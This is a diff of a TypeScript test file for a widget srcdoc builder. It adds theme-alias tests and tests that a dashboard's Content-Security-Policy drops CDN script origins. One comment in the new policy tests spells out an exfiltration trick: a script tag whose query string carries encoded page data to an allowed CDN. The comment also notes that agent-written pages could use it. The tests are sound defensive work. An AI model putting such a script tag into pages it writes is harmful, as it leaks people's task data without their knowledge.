@@ -32,6 +32,32 @@ describe('widgetSrcdoc', () => {
     expect(out).toContain('color-scheme:dark')
   })
 
+  it('aliases --surface to --card and --surface-secondary to --bg-elevated', () => {
+    const out = buildSrcdoc({
+      html: '<div style="background:var(--surface-secondary, #2a2a2a)">x</div>',
+      themeVars: { '--bg': '#fff', '--card': '#fafafa', '--bg-elevated': '#f5f5f5' },
+      mode: 'light',
+    })
+    expect(out).toContain('--surface:var(--card)')
+    expect(out).toContain('--surface-secondary:var(--bg-elevated)')
+  })
+
+  it('keeps a --surface value the caller passed instead of aliasing it', () => {
+    const out = buildSrcdoc({
+      html: '<x/>',
+      themeVars: { '--card': '#fafafa', '--surface': '#eeeeee' },
+      mode: 'light',
+    })
+    expect(out).toContain('--surface:#eeeeee')
+    expect(out).not.toContain('--surface:var(--card)')
+    expect(out).toContain('--surface-secondary:var(--bg-elevated)')
+  })
+
+  it('emits no aliases when there are no theme vars to apply', () => {
+    const out = buildSrcdoc({ html: '<x/>', themeVars: {}, mode: 'light' })
+    expect(out).not.toContain('--surface')
+  })
+
   it('omits the height reporter by default', () => {
     const out = buildSrcdoc({ html: '', themeVars: {}, mode: 'light' })
     expect(out).not.toContain('mc-widget-height')
@@ -118,5 +144,37 @@ describe('widgetSrcdoc', () => {
     // the widget immediately instead of hanging on the 15s backstop.
     expect(out).toContain('window.__mcTwError=1')
     expect(out).toContain('mc-tw-error')
+  })
+})
+
+describe("the dashboard document's script policy", () => {
+  // `connect-src 'none'` stops fetch and WebSocket, but a permitted script ORIGIN
+  // is a second channel: a page can append
+  // `<script src="https://cdn.jsdelivr.net/x.js?d=<encoded fields>">` and the
+  // browser sends that query out. For a widget that is the accepted trade -- the
+  // author is the person reading it. A crewmate's dashboard is filled with that
+  // crewmate's own task titles, summaries and costs, and since the preview/apply
+  // pair the page can be written by an agent and accepted by somebody who read the
+  // rendering rather than the markup.
+  const CDN = ['https://cdn.jsdelivr.net', 'https://cdnjs.cloudflare.com']
+
+  const cspOf = (doc: string): string =>
+    /content="([^"]*default-src[^"]*)"/.exec(doc)?.[1] ?? ''
+
+  it('drops the CDN script origins when offlineScripts is set', () => {
+    const csp = cspOf(
+      buildSrcdoc({ html: '<p>x</p>', themeVars: {}, mode: 'dark', offlineScripts: true }),
+    )
+    expect(csp).not.toBe('')
+    for (const origin of CDN) expect(csp).not.toContain(origin)
+    // Inline script still runs: a chart is script or it is nothing, and the page
+    // draws its own.
+    expect(csp).toContain("script-src 'unsafe-inline'")
+    expect(csp).toContain("connect-src 'none'")
+  })
+
+  it('leaves every other widget surface alone', () => {
+    const csp = cspOf(buildSrcdoc({ html: '<p>x</p>', themeVars: {}, mode: 'dark' }))
+    for (const origin of CDN) expect(csp).toContain(origin)
   })
 })
